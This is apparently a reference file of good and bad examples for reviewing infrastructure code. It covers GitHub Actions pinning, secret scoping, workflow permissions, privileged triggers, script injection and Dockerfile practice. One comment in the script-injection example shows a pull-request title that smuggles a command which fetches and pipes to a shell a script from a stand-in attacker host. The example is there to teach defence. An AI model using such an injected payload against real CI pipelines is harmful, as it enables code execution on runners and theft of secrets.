# Infra Reviewing - Core Examples

> Full code for the patterns in [SKILL.md](../SKILL.md), which carries the checklists and the severity framework.

---

## Pattern 1: Supply-Chain Pinning

```yaml
# Must Fix: a branch moves on every push; a third-party tag moves whenever its owner re-points it
- uses: actions/checkout@main
- uses: some-org/setup-tool@v2

# Should Fix: GitHub's own action, still on a movable tag — an org enforcing SHA pinning fails it at job setup
- uses: actions/checkout@v7

# Good: full commit SHAs from each action's own repository; the comment keeps the version readable
- uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
- uses: some-org/setup-tool@5c1f9e1a1c9436c9e73d29b3a1a8d9d5f7f0e2ab # v2.3.0
```

```yaml
# Should Fix: npm install may rewrite the lockfile CI just checked out
- run: npm install && npm test

# Good: the committed dependency tree exactly, or a failed step
- run: npm ci
- run: npm test
```

`npm ci` exits with an error when `package.json` and the lockfile disagree and never writes to either.

---

## Pattern 2: Secret Exposure

### Build secrets

```dockerfile
# Must Fix: `docker history` on the pushed image prints the token
ARG API_TOKEN
RUN curl -H "Authorization: Bearer ${API_TOKEN}" https://registry.example.com/setup

# Good: an env var for this RUN only (Dockerfile syntax 1.10+), absent from every layer
RUN --mount=type=secret,id=api_token,env=API_TOKEN \
    curl -H "Authorization: Bearer ${API_TOKEN}" https://registry.example.com/setup
```

```dockerfile
# Good: a whole credentials file, mounted where the tool looks for it
RUN --mount=type=secret,id=npmrc,target=/root/.npmrc npm ci
```

Supplied at build time with `docker build --secret id=api_token,env=API_TOKEN --secret id=npmrc,src=$HOME/.npmrc .`

### Secret scope in a workflow

```yaml
# Must Fix: every step in the job sees DEPLOY_KEY, the third-party action included
jobs:
  deploy:
    env:
      DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
    steps:
      - uses: some-org/notify-action@5c1f9e1a1c9436c9e73d29b3a1a8d9d5f7f0e2ab # v1.4.0
      - run: ./deploy.sh

# Good: only the step that uses it
jobs:
  deploy:
    steps:
      - uses: some-org/notify-action@5c1f9e1a1c9436c9e73d29b3a1a8d9d5f7f0e2ab # v1.4.0
      - env:
          DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
        run: ./deploy.sh
```

### Logs

```yaml
# Must Fix: set -x echoes the expanded header, and masking does not know the base64 form
- run: |
    set -x
    AUTH=$(printf '%s:%s' "$REGISTRY_USER" "$REGISTRY_PASSWORD" | base64)
    curl -H "Authorization: Basic $AUTH" https://registry.example.com

# Good: no tracing, and the derived value is registered for masking before anything can print it
- run: |
    AUTH=$(printf '%s:%s' "$REGISTRY_USER" "$REGISTRY_PASSWORD" | base64)
    echo "::add-mask::$AUTH"
    curl -H "Authorization: Basic $AUTH" https://registry.example.com
```

---

## Pattern 3: Workflow Trust Boundaries

### Permissions

```yaml
# Must Fix: no permissions block — the token gets whatever the organisation or repository default grants
name: test
on: pull_request
jobs:
  test:
    runs-on: ubuntu-latest

# Good: read-only by default, write scopes named per job
name: test
on: pull_request
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
  comment:
    runs-on: ubuntu-latest
    permissions:
      contents: read # a job's block replaces the workflow's, so restate what it still needs
      pull-requests: write
```

### Privileged triggers

```yaml
# Must Fix: fork code runs with the base repository's secrets and write token
on: pull_request_target
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          ref: ${{ github.event.pull_request.head.sha }}
          allow-unsafe-pr-checkout: true
      - run: npm ci && npm test

# Good: untrusted code runs under pull_request, where a fork PR gets no secrets and a read-only token
on: pull_request
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - run: npm ci && npm test
```

Where a fork PR's results genuinely need a privileged step — a comment, a label — a separate `workflow_run` job consumes the unprivileged run's output as data and never executes it.

### Script injection

```yaml
# Must Fix: a title of   a"; curl -s https://attacker.example/x | sh; echo "   runs on the runner
- run: echo "Checking ${{ github.event.pull_request.title }}"

# Good: the value reaches the shell as an environment variable, never as script text
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Checking $PR_TITLE"
```

---

## Pattern 4: Dockerfile Hygiene

```dockerfile
# Must Fix: runs as root
# Should Fix: every source change reinstalls dependencies; npm install ignores the lockfile;
#             build tooling and dev dependencies ship to production; no digest on a deploy-path image
FROM node:24-slim
COPY . .
RUN npm install && npm run build
CMD ["node", "dist/server.js"]

# Good: staged, manifest-first, unprivileged
FROM node:24-slim@sha256:a5f4366e834695d5f363b920c104953a535d3a9864d1bdf74566a0ebe01daee5 AS build
WORKDIR /app
COPY package.json package-lock.json ./
RUN npm ci
COPY . .
RUN npm run build

FROM node:24-slim@sha256:a5f4366e834695d5f363b920c104953a535d3a9864d1bdf74566a0ebe01daee5
WORKDIR /app
COPY package.json package-lock.json ./
RUN npm ci --omit=dev
COPY --from=build /app/dist ./dist
USER node
CMD ["node", "dist/server.js"]
```

The official Node images ship a `node` user (uid 1000) for exactly this line.

---

## Pattern 5: Pipeline Correctness

```yaml
# Should Fix: two quick merges deploy in whichever order the runners finish,
# and deploy starts as soon as the workflow does
jobs:
  deploy:
    runs-on: ubuntu-latest

# Good: one deploy at a time, after the whole suite. A newer run replaces any run still
# waiting in the group, so the latest merge wins and stale deploys never start.
concurrency:
  group: deploy-production
  cancel-in-progress: false
jobs:
  deploy:
    needs: [lint, test, e2e]
    runs-on: ubuntu-latest
```

`cancel-in-progress: true` on a deploy group would kill a deploy midway; leave it for jobs where an abandoned run costs nothing.

---

## Pattern 6: Deployment Safety, Scoped to the Diff

```dockerfile
# Should Fix: /bin/sh -c is PID 1 and does not pass SIGTERM on — every stop waits out the
# grace period and ends in SIGKILL, mid-request
CMD node dist/server.js

# Should Fix: npm sits between the signal and the app
CMD ["npm", "start"]

# Good: the app is the process the signal reaches
CMD ["node", "dist/server.js"]
```

As PID 1 the app gets no default signal handling, so it either installs a SIGTERM handler that drains in-flight work and exits, or runs under an init process (`docker run --init`, tini) that forwards the signal.
